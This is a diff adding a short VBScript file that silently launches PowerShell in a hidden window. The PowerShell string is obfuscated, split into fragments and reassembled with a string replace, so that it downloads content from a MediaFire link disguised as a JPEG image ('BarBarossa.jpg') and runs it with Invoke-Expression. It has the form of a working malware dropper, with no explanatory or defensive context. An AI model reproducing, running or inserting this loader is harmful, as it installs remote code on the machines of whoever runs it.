@@ -1,0 +1,3 @@
+on error resume next
+Set objShell = CreateObject ("WScript.shell")
+objShell.Run "powershell  $KXE='iex(NeW-OBJeCT NeT.W';$kds='eBCLIeNT).DOWNLO';Sleep 2;[BYTe[]];Sleep 3;$JHXwe='*****#%^&@__#@!!@$^&(''https://download1654.mediafire.com/px16w6yycvxgJ2irtzvbTIs86N-oQFc1riC_Ee9o2PYwpYN5MYWAbTRXV8pHn591BFWr81hASYzQ872-h8aJHE8BSXuiHVCKUoO9U8hQZeiU-gwZP7hN3HcBt9DDvXOFdR_a-vV6-9M_kettrZ5-dPR6klSYsMDdT8JCZZtpaodf/l1c9txqde0c906g/BarBarossa.jpg'')'.RePLACe('*****#%^&@__#@!!@$^&','ADSTRING');Sleep 1;($KXE+$kds+$JHXwe) | iex" , 0, True
